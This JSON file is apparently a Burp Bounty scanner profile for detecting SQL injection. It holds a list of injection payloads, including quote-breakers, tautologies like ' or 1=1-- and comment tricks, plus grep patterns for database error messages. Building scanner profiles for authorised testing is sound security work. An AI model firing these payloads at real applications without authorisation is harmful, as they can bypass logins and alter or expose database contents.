[
  {
    "ProfileName": "SQLi",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@burpbounty",
    "Payloads": [
      "\u0027-\u0027",
      "\u0027 \u0027",
      "\u0027\u0026\u0027",
      "\u0027^\u0027",
      "\u0027*\u0027",
      "\u0027 or \u0027\u0027-\u0027",
      "\u0027 or \u0027\u0027 \u0027",
      "\u0027 or \u0027\u0027\u0026\u0027",
      "\u0027 or \u0027\u0027^\u0027",
      "\u0027 or \u0027\u0027*\u0027",
      "\"-\"",
      "\" \"",
      "\"\u0026\"",
      "\"^\"",
      "\"*\"",
      "\" or \"\"-\"",
      "\" or \"\" \"",
      "\" or \"\"\u0026\"",
      "\" or \"\"^\"",
      "\" or \"\"*\"",
      "or true--",
      "\" or true--",
      "\u0027 or true--",
      "\") or true--",
      "\u0027) or true--",
      "\u0027 or \u0027x\u0027\u003d\u0027x",
      "\u0027) or (\u0027x\u0027)\u003d(\u0027x",
      "\u0027)) or ((\u0027x\u0027))\u003d((\u0027x",
      "\" or \"x\"\u003d\"x",
      "\") or (\"x\")\u003d(\"x",
      "\")) or ((\"x\"))\u003d((\"x",
      "or 1\u003d1",
      "or 1\u003d1-- ",
      "or 1\u003d1#",
      "or 1\u003d1/*",
      "\u0027",
      "\"",
      "`",
      "\\",
      "/*\u0027*/",
      "/*!1111\u0027*/",
      "\u0027||\u0027asd\u0027||\u0027",
      "or\u0027\u0027\u003d\u0027"
    ],
    "Encoder": [],
    "UrlEncode": true,
    "CharsToUrlEncode": "\u0026#",
    "Grep": [
      "true,,Microsoft OLE DB Provider for ODBC Drivers error",
      "true,Or,You have an error in your SQL syntax",
      "true,Or,ORA-00933: SQL command not properly ended",
      "true,Or,Microsoft SQL Native Client error",
      "true,Or,Query failed: ERROR: syntax error at or near",
      "true,Or,You have an error in your SQL syntax",
      "true,Or,MySQL Error: 1064",
      "true,Or,mysql error with query",
      "true,Or,SQL syntax error",
      "true,Or,PostgreSQL query failed: ERROR: parser: parse error",
      "true,Or,Warning: mysql_fetch_array",
      "true,Or,Warning: mysql_num_rows",
      "true,Or,Warning: mysql_query",
      "true,Or,Warning: mysql_fetch_assoc",
      "true,Or,Warning: mysql_result"
    ],
    "Tags": [
      "SQLI",
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 4,
    "MaxRedir": 3,
    "payloadPosition": 2,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "SQLi",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      65,
      32,
      36,
      1,
      2,
      6,
      5,
      35,
      34,
      64,
      0,
      3,
      4
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false
  }
]